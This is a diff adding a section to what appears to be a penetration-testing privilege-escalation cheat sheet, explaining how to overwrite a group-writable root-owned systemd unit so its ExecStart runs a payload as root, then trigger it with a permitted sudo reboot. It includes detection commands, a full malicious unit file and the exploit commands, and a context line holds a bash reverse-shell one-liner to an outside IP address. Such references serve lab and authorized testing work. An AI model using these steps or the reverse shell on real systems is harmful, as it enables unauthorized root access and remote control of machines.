@@ -1276,6 +1276,57 @@ bash -i >& /dev/tcp/10.13.22.22/1111 0>&1
 * We then use our `sudo -l` privlages to restart the service
 * ![alt text](https://miro.medium.com/max/2400/1\*JZqSzROFnTD6fNHWEHGSpw.png)
 
+### Writable systemd Service + Reboot Sudo
+
+If you can write to a systemd unit under `/etc/systemd/system/` and `sudo -l` only allows reboot-style commands, replace the unit with an `ExecStart` payload and trigger it with the allowed reboot.
+
+**Detection:**
+
+```bash
+sudo -l
+# (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
+
+find /etc/systemd/system -writable -type f 2>/dev/null
+ls -l /etc/systemd/system/pythonapp.service
+cat /etc/systemd/system/pythonapp.service
+```
+
+Watch for a service file that is writable by your group even though it is owned by root:
+
+```text
+-rw-rw-r-- 1 root cmeeks /etc/systemd/system/pythonapp.service
+```
+
+**Exploit:**
+
+```ini
+[Unit]
+Description=Python App
+After=network-online.target
+
+[Service]
+Type=simple
+WorkingDirectory=/home/cmeeks/restjson_hetemit
+ExecStart=/var/tmp/shell.elf
+TimeoutSec=30
+RestartSec=15s
+User=root
+ExecReload=/bin/kill -USR1 $MAINPID
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+```
+
+```bash
+# Transfer or write the payload first
+chmod +x /var/tmp/shell.elf
+cat pythonapp.service > /etc/systemd/system/pythonapp.service
+sudo /sbin/reboot
+```
+
+If the original service sets `User=someuser`, remove it or change it to `User=root`; otherwise the service will restart as the low-privilege account and the shell will not escalate.
+
 ### Nginx Sudo Privilege Escalation (WebDAV Method)
 
 If you can run `sudo /usr/sbin/nginx` (NOPASSWD), exploit via custom config with WebDAV to write files as root.
